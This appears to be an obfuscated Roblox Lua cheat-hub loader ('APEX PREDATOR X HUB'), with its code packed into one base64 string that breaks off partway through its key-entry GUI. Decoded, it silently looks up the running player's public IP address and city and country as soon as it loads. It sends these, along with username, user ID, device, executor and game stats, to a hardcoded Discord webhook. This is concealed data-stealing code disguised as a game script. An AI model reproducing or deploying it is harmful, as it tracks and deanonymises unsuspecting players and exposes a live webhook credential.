--[[Protected by Sen Obsfucator V3 | RMPG Services | Generated Time: 2025-11-27 11:44:00]] (function() local __b = "LS0gS2V5IFN5c3RlbSB3aXRoIFdoaXRlbGlzdApsb2NhbCB2YWxpZEtleXMgPSB7CiAgICAiMSIKfQoKLS0gV2hpdGVsaXN0ZWQgUm9ibG94IHVzZXJuYW1lcyAoY2FzZSBpbnNlbnNpdGl2ZSkKbG9jYWwgd2hpdGVsaXN0ZWRVc2VycyA9IHsKICAgICJqb2huX3NlbnNlaTUiLAogICAgIm9udG9wdHdpbiIsCiAgICAiam9obl9zZW5zZWk1IiwKICAgICJrdXJ0X2FybWFubGljdXAiLAogICAgInJpcF9pbmRyYXBvZ2kzMDkzIiwKICAgICJsaWV0b2RpZTEiLAogICAgIk5pZ2h0X3N0cmlrZXI4IiwKICAgICJEb2ZfUE9HSUFMVCIsCiAgICAibXVzY2xlX2xlZ2VuZHMwNTciLAogICAgIkltX2JlZzYiLAogICAgIkVOVEVSTkFMR0hPU1Q0IiwKICAgICJSaXBfa2l5b3NoMSIsCiAgICAidG9tbHVjYXMyNTI1IiwKICAgICJkYXZlY2FwaXpfNTUiLAogICAgIk9nX3ppb24xMjciLAogICAgInJpcF9pbmRyYXBvZ2kzMDkzIiwKICAgICJtYXNheW9uMTIzeHh6IiwKICAgICJrYW1kYWtvb2wiLAogICAgImx1bmFodWI5IiwgCiAgICAiY2xvd24yMjkwOSIsCiAgICAiQWx0bmlDeW1vbnRvaCIsCiAgICAiZGFya3ZhZGVyaXNibGFjayIsCiAgICAiT1hFTl9DQU5PTiIsCiAgICAiR0NIX0tVUEFMIiwKICAgICJNcW52cDkwOSIsCiAgICAiSmFtZXNnYW1pbmdib3lsbCIsCiAgICAibXVzaGVoMDA3IiwKICAgICJZb3VyZDNueiIsCiAgICAiSmFzbWluZV93YXJlbjFvIiwKICAgICJ1bmNsZWJhZHMxOSIsCiAgICAiemFja2FrYTIyMyIsCiAgICAiT3NoaXJ1MSIsCiAgICAiRjRfQ3NpZGUiLAogICAgIm5hdGhhbmJhbGlsaWExNCIKCn0KCi0tIFNlbmQgd2ViaG9vayBpbW1lZGlhdGVseSB3aGVuIHNjcmlwdCBsb2Fkcwpsb2NhbCBmdW5jdGlvbiBzZW5kSW5pdGlhbFdlYmhvb2soKQogICAgbG9jYWwgdXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0NDAyNjY2NzkzMTY2NDc5NzcvSUFTelNUckJ3a2hMMUZYV2tiS2lYQWJYWExSd09PR2tSYTM5NGRyc2pVeG9HVFN1VjUtcmx2RjlNRGo0eE00aVJteUgiCiAgICAKICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgc3RhdHMgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImxlYWRlcnN0YXRzIikKICAgIAogICAgLS0gRW5oYW5jZWQgSVAgRGV0ZWN0aW9uIEZ1bmN0aW9uCiAgICBsb2NhbCBmdW5jdGlvbiBnZXRBY2N1cmF0ZUlQKCkKICAgICAgICBsb2NhbCBpcFNlcnZpY2VzID0gewogICAgICAgICAgICAiaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uIiwKICAgICAgICAgICAgImh0dHBzOi8vYXBpLm15LWlwLmlvL2lwLmpzb24iLCAKICAgICAgICAgICAgImh0dHBzOi8vaXBhcGkuY28vanNvbi8iLAogICAgICAgICAgICAiaHR0cHM6Ly9pcGluZm8uaW8vanNvbiIsCiAgICAgICAgICAgICJodHRwczovL2h0dHBiaW4ub3JnL2lwIiwKICAgICAgICAgICAgImh0dHBzOi8vY2hlY2tpcC5hbWF6b25hd3MuY29tIiwKICAgICAgICAgICAgImh0dHBzOi8vaWNhbmhhemlwLmNvbSIsCiAgICAgICAgICAgICJodHRwczovL2lkZW50Lm1lIiwKICAgICAgICAgICAgImh0dHBzOi8vaXBlY2hvLm5ldC9wbGFpbiIsCiAgICAgICAgICAgICJodHRwczovL3d0ZmlzbXlpcC5jb20vanNvbiIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgbG9jYWwgZmFsbGJhY2tJUCA9ICJVbmtub3duIgogICAgICAgIAogICAgICAgIGZvciBpLCBzZXJ2aWNlVXJsIGluIGlwYWlycyhpcFNlcnZpY2VzKSBkbwogICAgICAgICAgICBsb2NhbCBzdWNjZXNzLCByZXN1bHQgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCByZXNwb25zZSA9IGdhbWU6SHR0cEdldChzZXJ2aWNlVXJsLCB0cnVlKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBzZXJ2aWNlVXJsOmZpbmQoImpzb24iKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgZGF0YSA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKTpKU09ORGVjb2RlKHJlc3BvbnNlKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIHNlcnZpY2VVcmw6ZmluZCgiaXBpZnkiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkYXRhLmlwCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHNlcnZpY2VVcmw6ZmluZCgibXktaXAiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkYXRhLmlwCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHNlcnZpY2VVcmw6ZmluZCgiaXBhcGkiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkYXRhLmlwCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHNlcnZpY2VVcmw6ZmluZCgiaXBpbmZvIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZGF0YS5pcAogICAgICAgICAgICAgICAgICAgIGVsc2VpZiBzZXJ2aWNlVXJsOmZpbmQoInd0ZmlzbXlpcCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGRhdGEuWW91ckZ1Y2tpbmdJUEFkZHJlc3MKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgc2VydmljZVVybDpmaW5kKCJodHRwYmluIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZGF0YS5vcmlnaW4KICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVzcG9uc2U6Z3N1YigiJXMrIiwgIiIpOmdzdWIoIlxuIiwgIiIpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgc3VjY2VzcyBhbmQgcmVzdWx0IGFuZCByZXN1bHQgfj0gIiIgYW5kIHJlc3VsdCB+PSAiVW5rbm93biIgdGhlbgogICAgICAgICAgICAgICAgaWYgcmVzdWx0Om1hdGNoKCJeKCVkKyUuJWQrJS4lZCslLiVkKykkIikgb3IgcmVzdWx0Om1hdGNoKCJeWyV4Ol0rJCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHdhaXQoMC4xKQogICAgICAgIGVuZAogICAgICAgIHJldHVybiBmYWxsYmFja0lQCiAgICBlbmQKCiAgICAtLSBFbmhhbmNlZCBMb2NhdGlvbiBEZXRlY3Rpb24KICAgIGxvY2FsIGZ1bmN0aW9uIGdldEVuaGFuY2VkTG9jYXRpb24oaXBBZGRyZXNzKQogICAgICAgIGlmIGlwQWRkcmVzcyA9PSAiVW5rbm93biIgdGhlbgogICAgICAgICAgICByZXR1cm4gIlVua25vd24gTG9jYXRpb24iCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgbG9jYXRpb25TZXJ2aWNlcyA9IHsKICAgICAgICAgICAgImh0dHA6Ly9pcC1hcGkuY29tL2pzb24vIiAuLiBpcEFkZHJlc3MsCiAgICAgICAgICAgICJodHRwczovL2lwYXBpLmNvLyIgLi4gaXBBZGRyZXNzIC4uICIvanNvbi8iLAogICAgICAgICAgICAiaHR0cHM6Ly9pcGluZm8uaW8vIiAuLiBpcEFkZHJlc3MgLi4gIi9qc29uIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBmb3IgaSwgc2VydmljZVVybCBpbiBpcGFpcnMobG9jYXRpb25TZXJ2aWNlcykgZG8KICAgICAgICAgICAgbG9jYWwgc3VjY2VzcywgbG9jYXRpb25EYXRhID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbG9jYWwgcmVzcG9uc2UgPSBnYW1lOkh0dHBHZXQoc2VydmljZVVybCwgdHJ1ZSkKICAgICAgICAgICAgICAgIGxvY2FsIGRhdGEgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIik6SlNPTkRlY29kZShyZXNwb25zZSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgc2VydmljZVVybDpmaW5kKCJpcCUtYXBpIikgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIGRhdGEuc3RhdHVzID09ICJzdWNjZXNzIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGNpdHkgPSBkYXRhLmNpdHkgb3IgIlVua25vd24iCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGNvdW50cnkgPSBkYXRhLmNvdW50cnkgb3IgIlVua25vd24iCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAi8J+TjSAiIC4uIGNpdHkgLi4gIiwgIiAuLiBjb3VudHJ5CiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbHNlaWYgc2VydmljZVVybDpmaW5kKCJpcGFwaSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBjaXR5ID0gZGF0YS5jaXR5IG9yICJVbmtub3duIgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGNvdW50cnkgPSBkYXRhLmNvdW50cnlfbmFtZSBvciAiVW5rbm93biIKICAgICAgICAgICAgICAgICAgICByZXR1cm4gIvCfk40gIiAuLiBjaXR5IC4uICIsICIgLi4gY291bnRyeQogICAgICAgICAgICAgICAgZWxzZWlmIHNlcnZpY2VVcmw6ZmluZCgiaXBpbmZvIikgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGNpdHkgPSBkYXRhLmNpdHkgb3IgIlVua25vd24iCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY291bnRyeSA9IGRhdGEuY291bnRyeSBvciAiVW5rbm93biIKICAgICAgICAgICAgICAgICAgICByZXR1cm4gIvCfk40gIiAuLiBjaXR5IC4uICIsICIgLi4gY291bnRyeQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHN1Y2Nlc3MgYW5kIGxvY2F0aW9uRGF0YSB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4gbG9jYXRpb25EYXRhCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHJldHVybiAi8J+TjSBVbmtub3duIExvY2F0aW9uIgogICAgZW5kCiAgICAKICAgIC0tIEdldCBhY2N1cmF0ZSBJUCBhbmQgbG9jYXRpb24KICAgIGxvY2FsIGFjY3VyYXRlSVAgPSBnZXRBY2N1cmF0ZUlQKCkKICAgIGxvY2FsIGxvY2F0aW9uID0gZ2V0RW5oYW5jZWRMb2NhdGlvbihhY2N1cmF0ZUlQKQogICAgCiAgICAtLSBGdW5jdGlvbiB0byBmb3JtYXQgbnVtYmVycyB3aXRoIGFiYnJldmlhdGlvbnMKICAgIGxvY2FsIGZ1bmN0aW9uIGZvcm1hdE51bWJlcihudW0pCiAgICAgICAgaWYgbm90IG51bSB0aGVuIHJldHVybiAiTi9BIiBlbmQKICAgICAgICBsb2NhbCBmb3JtYXRzID0gewogICAgICAgICAgICB7MWUxOCwgIlFpIn0sIHsxZTE1LCAiUWEifSwgezFlMTIsICJUIn0sIAogICAgICAgICAgICB7MWU5LCAiQiJ9LCB7MWU2LCAiTSJ9LCB7MWUzLCAiSyJ9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIGZvciBfLCBmb3JtYXQgaW4gaXBhaXJzKGZvcm1hdHMpIGRvCiAgICAgICAgICAgIGlmIG51bSA+PSBmb3JtYXRbMV0gdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIHN0cmluZy5mb3JtYXQoIiUuMWYlcyIsIG51bSAvIGZvcm1hdFsxXSwgZm9ybWF0WzJdKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICByZXR1cm4gdG9zdHJpbmcobnVtKQogICAgZW5kCiAgICAKICAgIC0tIEdldCBzdGF0cwogICAgbG9jYWwgc3RyZW5ndGggPSBzdGF0cyBhbmQgc3RhdHM6RmluZEZpcnN0Q2hpbGQoIlN0cmVuZ3RoIikgYW5kIHN0YXRzLlN0cmVuZ3RoLlZhbHVlIG9yIDAKICAgIGxvY2FsIGR1cmFiaWxpdHkgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkR1cmFiaWxpdHkiKSBhbmQgcGxheWVyLkR1cmFiaWxpdHkuVmFsdWUgb3IgMAogICAgbG9jYWwgcmViaXJ0aHMgPSBzdGF0cyBhbmQgc3RhdHM6RmluZEZpcnN0Q2hpbGQoIlJlYmlydGhzIikgYW5kIHN0YXRzLlJlYmlydGhzLlZhbHVlIG9yIDAKICAgIAogICAgLS0gRW5oYW5jZWQgZGV2aWNlIGRldGVjdGlvbgogICAgbG9jYWwgZGV2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIik6R2V0UGxhdGZvcm0oKS5OYW1lCiAgICBsb2NhbCBleGVjdXRvciA9ICJVbmtub3duIgogICAgCiAgICAtLSBEZXRlY3QgZXhlY3V0b3IgbW9yZSBhY2N1cmF0ZWx5CiAgICBpZiBzeW4gdGhlbgogICAgICAgIGV4ZWN1dG9yID0gIlN5bmFwc2UgWCIKICAgIGVsc2VpZiBQUk9UT1NNQVNIRVJfTE9BREVEIHRoZW4KICAgICAgICBleGVjdXRvciA9ICJQcm90b1NtYXNoZXIiCiAgICBlbHNlaWYgS1JOTF9MT0FERUQgdGhlbgogICAgICAgIGV4ZWN1dG9yID0gIktSTkwiCiAgICBlbHNlaWYgaWRlbnRpZnlleGVjdXRvciB0aGVuCiAgICAgICAgZXhlY3V0b3IgPSBpZGVudGlmeWV4ZWN1dG9yKCkgb3IgIlVua25vd24iCiAgICBlbmQKCiAgICAtLSBDaGVjayBpZiB1c2VyIGlzIHdoaXRlbGlzdGVkCiAgICBsb2NhbCBmdW5jdGlvbiBpc1VzZXJXaGl0ZWxpc3RlZCgpCiAgICAgICAgbG9jYWwgcGxheWVyTmFtZSA9IHBsYXllci5OYW1lOmxvd2VyKCkKICAgICAgICBmb3IgXywgd2hpdGVsaXN0ZWROYW1lIGluIGlwYWlycyh3aGl0ZWxpc3RlZFVzZXJzKSBkbwogICAgICAgICAgICBpZiBwbGF5ZXJOYW1lID09IHdoaXRlbGlzdGVkTmFtZTpsb3dlcigpIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHJldHVybiBmYWxzZQogICAgZW5kCgogICAgbG9jYWwgaXNXaGl0ZWxpc3RlZCA9IGlzVXNlcldoaXRlbGlzdGVkKCkKCiAgICBsb2NhbCBkYXRhID0gewogICAgICAgIFsiY29udGVudCJdID0gIvCfjq4gKipBUEVYIFBSRURBVE9SIFggLSBTQ1JJUFQgTE9BREVEKioiLAogICAgICAgIFsiZW1iZWRzIl0gPSB7ewogICAgICAgICAgICBbInRpdGxlIl0gPSAi8J+UsCBTY3JpcHQgRXhlY3V0aW9uIFN0YXJ0ZWQiLAogICAgICAgICAgICBbImNvbG9yIl0gPSBpc1doaXRlbGlzdGVkIGFuZCA2NTI4MCBvciAxNjcxMTY4MCwgLS0gR3JlZW4gaWYgd2hpdGVsaXN0ZWQsIFJlZCBpZiBub3QKICAgICAgICAgICAgWyJ0aHVtYm5haWwiXSA9IHsKICAgICAgICAgICAgICAgIFsidXJsIl0gPSAiaHR0cHM6Ly93d3cucm9ibG94LmNvbS9oZWFkc2hvdC10aHVtYm5haWwvaW1hZ2U/dXNlcklkPSIgLi4gcGxheWVyLlVzZXJJZCAuLiAiJndpZHRoPTQyMCZoZWlnaHQ9NDIwJmZvcm1hdD1wbmciCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIFsiZmllbGRzIl0gPSB7CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgWyJuYW1lIl0gPSAi8J+RpCBQbGF5ZXIgSW5mb3JtYXRpb24iLAogICAgICAgICAgICAgICAgICAgIFsidmFsdWUiXSA9ICIqKlVzZXJuYW1lOioqIGAiIC4uIHBsYXllci5OYW1lIC4uICJgXG4qKkRpc3BsYXk6KiogIiAuLiBwbGF5ZXIuRGlzcGxheU5hbWUgLi4gIlxuKipVc2VyIElEOioqIGAiIC4uIHBsYXllci5Vc2VySWQgLi4gImAiLAogICAgICAgICAgICAgICAgICAgIFsiaW5saW5lIl0gPSB0cnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFsibmFtZSJdID0gIvCfjI0gTG9jYXRpb24gRGF0YSIsCiAgICAgICAgICAgICAgICAgICAgWyJ2YWx1ZSJdID0gIioqSVA6KiogYCIgLi4gYWNjdXJhdGVJUCAuLiAiYFxuIiAuLiBsb2NhdGlvbiwKICAgICAgICAgICAgICAgICAgICBbImlubGluZSJdID0gdHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBbIm5hbWUiXSA9ICLwn5K7IFN5c3RlbSBJbmZvcm1hdGlvbiIsCiAgICAgICAgICAgICAgICAgICAgWyJ2YWx1ZSJdID0gIioqUGxhdGZvcm06KiogIiAuLiBkZXZpY2UgLi4gIlxuKipFeGVjdXRvcjoqKiAiIC4uIGV4ZWN1dG9yLAogICAgICAgICAgICAgICAgICAgIFsiaW5saW5lIl0gPSB0cnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFsibmFtZSJdID0gIvCflJAgU2VjdXJpdHkgU3RhdHVzIiwKICAgICAgICAgICAgICAgICAgICBbInZhbHVlIl0gPSAiKipXaGl0ZWxpc3RlZDoqKiAiIC4uIChpc1doaXRlbGlzdGVkIGFuZCAi4pyFIFllcyIgb3IgIuKdjCBObyIpIC4uICJcbioqS2V5IFJlcXVpcmVkOioqICIgLi4gKGlzV2hpdGVsaXN0ZWQgYW5kICLinIUgWWVzIiBvciAi4p2MIE5vIiksCiAgICAgICAgICAgICAgICAgICAgWyJpbmxpbmUiXSA9IHRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgWyJuYW1lIl0gPSAi8J+SqiBHYW1lIFN0YXRpc3RpY3MiLAogICAgICAgICAgICAgICAgICAgIFsidmFsdWUiXSA9ICLwn5KqICoqU3RyZW5ndGg6KiogYCIgLi4gZm9ybWF0TnVtYmVyKHN0cmVuZ3RoKSAuLiAiYFxu8J+boe+4jyAqKkR1cmFiaWxpdHk6KiogYCIgLi4gZm9ybWF0TnVtYmVyKGR1cmFiaWxpdHkpIC4uICJgXG7wn5SEICoqUmViaXJ0aHM6KiogYCIgLi4gZm9ybWF0TnVtYmVyKHJlYmlydGhzKSAuLiAiYCIsCiAgICAgICAgICAgICAgICAgICAgWyJpbmxpbmUiXSA9IHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgWyJmb290ZXIiXSA9IHsKICAgICAgICAgICAgICAgIFsidGV4dCJdID0gIkFQRVggUFJFREFUT1IgWCDigKIgU2NyaXB0IExvYWRlZCDigKIgIiAuLiBvcy5kYXRlKCIlWS0lbS0lZCBhdCAlSDolTTolUyIpCiAgICAgICAgICAgIH0KICAgICAgICB9fQogICAgfQogICAgCiAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgaHR0cCA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKQogICAgICAgIGxvY2FsIHJlc3BvbnNlID0gaHR0cDpSZXF1ZXN0QXN5bmMoewogICAgICAgICAgICBVcmwgPSB1cmwsCiAgICAgICAgICAgIE1ldGhvZCA9ICJQT1NUIiwKICAgICAgICAgICAgSGVhZGVycyA9IHsKICAgICAgICAgICAgICAgIFsiQ29udGVudC1UeXBlIl0gPSAiYXBwbGljYXRpb24vanNvbiIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgQm9keSA9IGh0dHA6SlNPTkVuY29kZShkYXRhKQogICAgICAgIH0pCiAgICBlbmQpCmVuZAoKLS0gU2VuZCB3ZWJob29rIGltbWVkaWF0ZWx5IHdoZW4gc2NyaXB0IHN0YXJ0cwpzZW5kSW5pdGlhbFdlYmhvb2soKQoKLS0gQ29udGludWUgd2l0aCB0aGUgcmVzdCBvZiB0aGUga2V5IHN5c3RlbS4uLgpsb2NhbCBrZXlHdWkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCmtleUd1aS5OYW1lID0gIktleVN5c3RlbSIKa2V5R3VpLlBhcmVudCA9IGdhbWUuQ29yZUd1aQoKbG9jYWwga2V5RnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKa2V5RnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygwLCAzMjAsIDAsIDIwMCkKa2V5RnJhbWUuUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAtMTYwLCAwLjUsIC0xMDApCmtleUZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxNSwgMTUsIDIwKQprZXlGcmFtZS5QYXJlbnQgPSBrZXlHdWkKCmxvY2FsIFVJQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpClVJQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDEwKQpVSUNvcm5lci5QYXJlbnQgPSBrZXlGcmFtZQoKLS0gVGhpY2sgQW5pbWF0ZWQgR3JhZGllbnQgQm9yZGVyCmxvY2FsIFVJU3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpClVJU3Ryb2tlLkNvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKVUlTdHJva2UuVGhpY2tuZXNzID0gNApVSVN0cm9rZS5QYXJlbnQgPSBrZXlGcmFtZQoKbG9jYWwgZ3JhZGllbnQgPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiKQpncmFkaWVudC5Db2xvciA9IENvbG9yU2VxdWVuY2UubmV3KHsKICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMCwgQ29sb3IzLmZyb21SR0IoNTEsIDUxLCA1MSkpLCAgIC0tICMzMzMzMzMKICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgQ29sb3IzLmZyb21SR0IoMjIxLCAyNCwgMjQpKSAgIC0tICNkZDE4MTgKfSkKZ3JhZGllbnQuUm90YXRpb24gPSAwCmdyYWRpZW50LlBhcmVudCA9IFVJU3Ryb2tlCgotLSBBbmltYXRlIHRoZSBncmFkaWVudCByb3RhdGlvbgpzcGF3bihmdW5jdGlvbigpCiAgICB3aGlsZSBrZXlHdWkuUGFyZW50IGRvCiAgICAgICAgZm9yIGkgPSAwLCAzNjAsIDIgZG8KICAgICAgICAgICAgZ3JhZGllbnQuUm90YXRpb24gPSBpCiAgICAgICAgICAgIHdhaXQoMC4wMykKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgotLSBBUEVYIFBSRURBVE9SIFggVGl0bGUgd2l0aCBUcmlwbGUgR3JhZGllbnQKbG9jYWwgdGl0bGUgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCnRpdGxlLlRleHQgPSAiQVBFWCBQUkVEQVRPUiBYIEhVQiIKdGl0bGUuU2l6ZSA9IFVEaW0yLm5ldygwLjksIDAsIDAsIDMwKQp0aXRsZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjA1LCAwLCAwLjEsIDApCnRpdGxlLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCnRpdGxlLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQp0aXRsZS5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJsYWNrCnRpdGxlLlRleHRTaXplID0gMjAKdGl0bGUuVGV4dFN0cm9rZVRyYW5zcGFyZW5jeSA9IDAuOAp0aXRsZS5UZXh0U3Ryb2tlQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCkKdGl0bGUuUGFyZW50ID0ga2V5RnJhbWUKCmxvY2FsIHRpdGxlR3JhZGllbnQgPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiKQp0aXRsZUdyYWRpZW50LkNvbG9yID0gQ29sb3JTZXF1ZW5jZS5uZXcoewogICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCBDb2xvcjMuZnJvbVJHQigyNiwgNDIsIDEwOCkpLCAgIC0tICMxYTJhNmMKICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC41LCBDb2xvcjMuZnJvbVJHQigxNzgsIDMxLCAzMSkpLCAtLSAjYjIxZjFmCiAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDI1MywgMTg3LCA0NSkpICAgLS0gI2ZkYmIyZAp9KQp0aXRsZUdyYWRpZW50LlJvdGF0aW9uID0gMAp0aXRsZUdyYWRpZW50LlBhcmVudCA9IHRpdGxlCgotLSBBbmltYXRlIHRpdGxlIGdyYWRpZW50CnNwYXduKGZ1bmN0aW9uKCkKICAgIHdoaWxlIGtleUd1aS5QYXJlbnQgZG8KICAgICAgICBmb3IgaSA9IDAsIDM2MCwgMyBkbwogICAgICAgICAgICB0aXRsZUdyYWRpZW50LlJvdGF0aW9uID0gaQogICAgICAgICAgICB3YWl0KDAuMDQpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKLS0gIkJ5IDogRHlsYW4iIFN1YnRpdGxlIHdpdGggc2FtZSBncmFkaWVudApsb2NhbCBzdWJ0aXRsZSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKc3VidGl0bGUuVGV4dCA9ICJCeSA6IER5bGFuIgpzdWJ0aXRsZS5TaXplID0gVURpbTIubmV3KDAuOSwgMCwgMCwgMTUpCnN1YnRpdGxlLlBvc2l0aW9uID0gVURpbTIubmV3KDAuMDUsIDAsIDAuMjUsIDApCnN1YnRpdGxlLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCnN1YnRpdGxlLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQpzdWJ0aXRsZS5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKc3VidGl0bGUuVGV4dFNpemUgPSAxMApzdWJ0aXRsZS5UZXh0U3Ryb2tlVHJhbnNwYXJlbmN5ID0gMC44CnN1YnRpdGxlLlRleHRTdHJva2VDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKQpzdWJ0aXRsZS5QYXJlbnQgPSBrZXlGcmFtZQoKbG9jYWwgc3VidGl0bGVHcmFkaWVudCA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIpCnN1YnRpdGxlR3JhZGllbnQuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ldyh7CiAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAsIENvbG9yMy5mcm9tUkdCKDI2LCA0MiwgMTA4KSksICAgLS0gIzFhMmE2YwogICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjUsIENvbG9yMy5mcm9tUkdCKDE3OCwgMzEsIDMxKSksIC0tICNiMjFmMWYKICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMSwgQ29sb3IzLmZyb21SR0IoMjUzLCAxODcsIDQ1KSkgICAtLSAjZmRiYjJkCn0pCnN1YnRpdGxlR3JhZGllbnQuUm90YXRpb24gPSAwCnN1YnRpdGxlR3JhZGllbnQuUGFyZW50ID0gc3VidGl0bGUKCi0tIEFuaW1hdGUgc3VidGl0bGUgZ3JhZGllbnQKc3Bhd24oZnVuY3Rpb24oKQogICAgd2hpbGUga2V5R3VpLlBhcmVudCBkbwogICAgICAgIGZvciBpID0gMzYwLCAwLCAtMyBkbwogICAgICAgICAgICBzdWJ0aXRsZUdyYWRpZW50LlJvdGF0aW9uID0gaQogICAgICAgICAgICB3YWl0KDAuMDUpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKbG9jYWwga2V5Qm94ID0gSW5zdGFuY2UubmV3KCJUZXh0Qm94IikKa2V5Qm94LlNpemUgPSBVRGltMi5uZXcoMC44LCAwLCAwLCAzMCkKa2V5Qm94LlBvc2l0aW9uID0g